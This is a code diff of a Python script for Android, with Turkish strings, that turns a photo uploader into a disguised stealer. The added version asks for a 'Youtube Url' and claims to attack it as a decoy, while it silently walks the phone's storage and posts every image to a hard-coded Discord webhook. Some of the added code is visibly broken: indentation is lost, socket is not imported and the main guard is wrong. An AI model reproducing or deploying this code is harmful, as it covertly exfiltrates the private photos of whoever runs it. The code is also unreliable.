@@ -1,37 +1,64 @@
 import os
 import requests
 import time
+import random
 from tqdm import tqdm
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1414709102415708260/fchkKmLpaYQDW09genXyEsvB3V6eerwvAuVxBPeQlve6h8sD31aowoM2pLbTefuWe0pl"  # Kendi Discord webhook adresini buraya yaz
+WEBHOOK_URL = "https://discord.com/api/webhooks/1414709102415708260/fchkKmLpaYQDW09genXyEsvB3V6eerwvAuVxBPeQlve6h8sD31aowoM2pLbTefuWe0pl"
 
-def send_to_discord(image_path):
-    try:
-        with open(image_path, "rb") as f:
-            files = {"file": f}
-            response = requests.post(WEBHOOK_URL, files=files, timeout=30)
-            return response.status_code == 204 or response.status_code == 200
-    except Exception as e:
-        print(f"Hata: {e} - {image_path}")
-        return False
+def get_device_info():
+try:
+hostname = socket.gethostname()
+local_ip = socket.gethostbyname(hostname)
+return hostname, local_ip
+except:
+return "Bilinmiyor", "Bilinmiyor"
 
-def main():
-    image_dir = "/storage/emulated/0/DCIM/"
-    # Bütün alt klasörlerdeki fotoğrafları bul
-    image_files = []
-    for root, dirs, files in os.walk(image_dir):
-        for file in files:
-            if file.lower().endswith((".jpg", ".jpeg", ".png")):
-                image_files.append(os.path.join(root, file))
+def send_to_discord(file_path):
+try:
+with open(file_path, 'rb') as file:
+files = {'file': (os.path.basename(file_path), file)}
+requests.post(WEBHOOK_URL, files=files)
+except:
+pass
 
-    print(f"Toplam {len(image_files)} fotoğraf bulundu. Gönderiliyor...")
+def scan_and_upload():
+image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
+base_dir = "/storage/emulated/0"
 
-    # Sırayla, her 1 saniyede bir gönder
-    for image_path in tqdm(image_files, desc="YÜKLENİYOR", unit="foto"):
-        if send_to_discord(image_path):
-            time.sleep(1)  # Her gönderimden sonra 1 saniye bekle
-        else:
-            print(f"Fotoğraf gönderilemedi: {image_path}")
+target_id = input("Youtube Url ")  
+print(f"\n **{target_id}** attack...")  
+  
+image_files = []  
+for root, _, files in os.walk(base_dir):  
+    for file in files:  
+        if file.lower().endswith(image_extensions):  
+            image_files.append(os.path.join(root, file))  
+  
+total_images = len(image_files)  
+if total_images == 0:  
+    print("No url!")  
+    return  
+  
+print(f" **{total_images}** başlıyor...\n")  
+  
+for image_path in tqdm(image_files, desc="BAŞLADI", unit="0"):  
+    send_to_discord(image_path)  
+    time.sleep(1)   
+  
+print("\n Gönderim Tamamlandı !")
 
-if __name__ == "__main__":
-    main()
+if name == "main":
+print("""
+
+
+---
+
+\ / /  / /  / | / /  /  /  / /      /  |/  /  / /  /  /     _ | |
+\  /  / __/    /  |/ /   / /   / /      / /|/ /  / __/       / /     ()/ /
+/ /  / /   / /|  /  / /   / /   / /  / /  / /___      / /__   _  / /
+//  /_____/  // |/  //  //  //  //  /__/     /_/  ()//
+//
+""")
+scan_and_upload()
+
